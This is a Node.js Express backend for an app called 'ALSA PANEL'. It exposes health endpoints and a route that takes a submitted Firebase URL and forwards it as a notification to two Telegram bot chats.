const express = require("express");
const cors = require("cors");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());

const BOT_1_TOKEN = process.env.BOT_1_TOKEN || "";
const BOT_2_TOKEN = process.env.BOT_2_TOKEN || "";

const CHAT_ID_1 = "-1004414013670";
const CHAT_ID_2 = "-1004440433866";

async function sendTelegram(token, chatId, message) {
  if (!token) {
    return {
      success: false,
      error: "Bot token missing"
    };
  }

  try {
    const response = await fetch(
      `https://api.telegram.org/bot${token}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "HTML",
          disable_web_page_preview: true
        })
      }
    );

    const data = await response.json();

    if (!data.ok) {
      return {
        success: false,
        error: data.description || "Telegram error"
      };
    }

    return {
      success: true
    };

  } catch (error) {
    return {
      success: false,
      error: error.message
    };
  }
}


// Home
app.get("/", (req, res) => {
  res.json({
    app: "ALSA PANEL Backend",
    version: "1.0.0",
    status: "online"
  });
});


// Health Check
app.get("/health", (req, res) => {
  res.json({
    success: true,
    status: "healthy",
    uptime: process.uptime()
  });
});


// Firebase Connected
app.post("/api/firebase-connected", async (req, res) => {
  try {

    const {
      event,
      firebaseUrl,
      time
    } = req.body || {};


    if (event !== "firebase_connected") {
      return res.status(400).json({
        success: false,
        error: "Invalid event"
      });
    }


    if (!firebaseUrl) {
      return res.status(400).json({
        success: false,
        error: "Firebase URL required"
      });
    }


    const message = `
<b>🔥 ALSA PANEL</b>

<b>Firebase Connected</b>

<b>Firebase URL:</b>
<code>${String(firebaseUrl)
  .replace(/&/g, "&amp;")
  .replace(/</g, "&lt;")
  .replace(/>/g, "&gt;")}</code>

<b>Time:</b>
<code>${time || new Date().toISOString()}</code>
`;


    // দুইটা bot-এ একসাথে পাঠাবে
    const results = await Promise.all([
      sendTelegram(
        BOT_1_TOKEN,
        CHAT_ID_1,
        message
      ),

      sendTelegram(
        BOT_2_TOKEN,
        CHAT_ID_2,
        message
      )
    ]);


    const sent = results.filter(
      result => result.success
    ).length;


    res.json({
      success: sent > 0,

      botsSent: sent,

      bot1: results[0].success,

      bot2: results[1].success
    });


  } catch (error) {

    console.error(
      "ALSA Backend Error:",
      error
    );

    res.status(500).json({
      success: false,
      error: "Internal server error"
    });

  }
});


app.listen(PORT, () => {

  console.log(
    `ALSA PANEL Backend running on port ${PORT}`
  );

});
